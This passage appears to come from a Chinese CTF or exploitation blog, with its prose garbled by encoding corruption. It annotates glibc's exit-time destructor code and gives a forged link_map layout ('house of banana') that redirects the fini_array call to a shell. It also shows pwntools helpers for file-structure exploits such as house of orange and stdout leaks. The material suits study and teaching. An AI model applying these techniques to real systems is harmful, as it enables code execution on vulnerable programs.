class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  ç›´åˆ°å‡ºç°0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// éœ€è¦è¿›å…¥è¿™ä¸ªifçº¿</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// æ‰€ä»¥è¯´ä¸ä¼šè¶…è¿‡4ä¸ª</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// è¿‡å…¶ä¸­ä¸€ä¸ªæ£€æŸ¥ï¼Œi==nloaded,ä¹Ÿå°±æ˜¯å…¨éƒ¨çš„ifçº¿éƒ½è¦è¿›å…¥ã€‚</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// è¿›å…¥è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èµ°åˆ° <code>_dl_call_fini</code></p><ul><li>å­˜åœ¨ä¸€ä¸ªå‡½æ•°è°ƒç”¨ <code>((fini_t)array[sz])()</code>ï¼Œmapä¸ºå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ <code>GL(dl_ns)[ns]._ns_loaded</code> å’Œå…¶ nextï¼Œnext-&gt;nextâ€¦</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded å’Œ l_next æŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) ä¸Šä¸€ä¸ªæŒ‡ä»¤åœ°å€</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line"><span class="comment">// ä¸ç®¡ä»€ä¹ˆç±»å‹ï¼Œæœ€åè°ƒç”¨çš„å‡½æ•°åœ°å€å¯ä»¥å¾—åˆ°</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å‡½æ•°è°ƒç”¨èƒ½æ”»å‡»ä¸€ä¸‹å°±è¡Œï¼Œä¸ºäº†æ›´å®¹æ˜“çš„é€šè¿‡ifçš„æ¡ä»¶çš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ›¿æ¢é“¾è¡¨æœ€åä¸€ä¸ª link_mapï¼Œä¹Ÿå°±æ˜¯æ‰“ç¬¬3ä¸ªlinkmap<code>ns_loaded.l_next.l_next.l_netx</code></p><ul><li>è¿™æ˜¯éƒ¨åˆ†çš„å†…å®¹ï¼Œåªæˆªå–äº†æˆ‘ä»¬éœ€è¦çš„å†…å®¹</li><li>ä¼ªé€ l_addr, fini_array-&gt;d_un.d_ptr å†…å®¹</li><li>DT_FINI_ARRAY ä¸º 26ï¼ŒDT_FINI_ARRAYSZ ä¸º 28</li><li>å› ä¸ºæºç å¯èƒ½æ¯”è¾ƒæŠ½è±¡ï¼Œä¸å¦‚ç›´æ¥æ‰“å°å‡ºæ¥ï¼Œè¿™é‡Œåªæˆªå–æœ‰ç”¨çš„éƒ¨åˆ†</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">type = struct &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf64_Xword d_val;</span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure><p>ä¼ªé€ ï¼Œå †åœ°å€ A</p><ul><li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 å†…å®¹æ”¾ç€å †åœ°å€ <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li><li>l-&gt;l_init_called ä¸ä¸º0ï¼Œæ•°å­—éšæ„ï¼Œæ ¹æ®ç‰ˆæœ¬è€Œå¼‚ã€‚ <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>ã€‚æˆ‘æµ‹çš„æ˜¯0x312</li><li><code>map.l_info[26]</code> ä¸ä¸º 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li><li><code>map.l_info[28]</code> + 8 æ§åˆ¶å¾ªç¯æ¬¡æ•°ï¼Œä¸€èˆ¬å†™æˆ1å°±è¡Œ</li><li>æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>ã€‚ä¹Ÿå°±æ˜¯ <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li><li>fini_array <code>map.l_info[26]</code>åç§»æ˜¯0x110ã€‚é‚£ä¹ˆ28æ˜¯0x120</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_calledï¼Œä½†æ˜¯æµ‹è¯•åæ˜¯ä¸€ä¸ªmagic numï¼Œéœ€è¦å°†å…¶ä½™ç»“æ„ä½“çš„linkmap çš„ l_init_called æ‰“å°å‡ºæ¥èµ‹å€¼</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼Œéœ€è¦è®¾ç½® l_next ä½ç½®ä¸º0æ‰è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸‹é¢çš„å°±æ¯”è¾ƒå›ºå®šäº†</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 æ˜¯ d_un ç»“æ„ä½“æŒ‡é’ˆ</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// åé¢åŠ çš„é‚£ä¸ªä¸œè¥¿</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell æ‰§è¡Œshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]ã€‚ç”±ä¸Šå¯çŸ¥ï¼Œä¸º0ï¼ŒåŒæ—¶ä¸º 26 çš„ d_tag æˆå‘˜</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] çš„ d_un æŒ‡é’ˆã€‚ sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure><h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>å…¶å®çœ‹pwntoolsæ–‡æ¡£å¯ä»¥çœ‹å‡ºå…¶ä¸­å¯¹ <code>IO_FILE</code> ä¹Ÿå­˜åœ¨å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><ol><li>IO_FILE ç»“æ„ä½“</li></ol><ul><li><code>_wide_data</code> å°±æ˜¯æˆ‘ä»¬ç°åœ¨å¸¸åˆ©ç”¨çš„ç‚¹ã€‚</li><li>æ”¹å˜æˆå‘˜ä¹Ÿåªæ˜¯éœ€è¦ <code>fs.flags = 0x123</code> ç›´æ¥èµ‹å€¼</li><li>ä¸¤ä¸ª unknown å˜é‡å¡«å……ç»“æ„ä½“</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>house of orange</li></ol><ul><li>io_list_all åœ°å€</li><li>ä¼ªé€ çš„ vtable åœ°å€</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>stdout leak</li></ol><ul><li>ä» addr æ³„éœ² size å¤§å°çš„æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>packingï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¼ªé€ fileç»“æ„ä½“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ ¹æ® context.archæ‰“åŒ…ï¼Œ ç±»ä¼¼ p32ï¼Œp64 å‡½æ•°</span></span><br><span class="line">flat([</span><br><span class="line">  con1,</span><br><span class="line">  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, ç±»ä¼¼äº cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line"><span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å¯¹åç§»</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ—¶å¯ä»¥æŒ‡å®šå¡«å……å†…å®¹ å’Œ æ€»é•¿åº¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ªé€ ç»“æ„ä½“éœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æ³•å’Œflat(&#123;&#125;) ä¸€æ · å®˜æ–¹æ–‡æ¡£æ˜¯ alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœ€å¥½æ‰‹åŠ¨è°ƒè¯•ä¸€ä¸‹ largebin attack å’Œ house_of_bananaã€‚</p><h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of 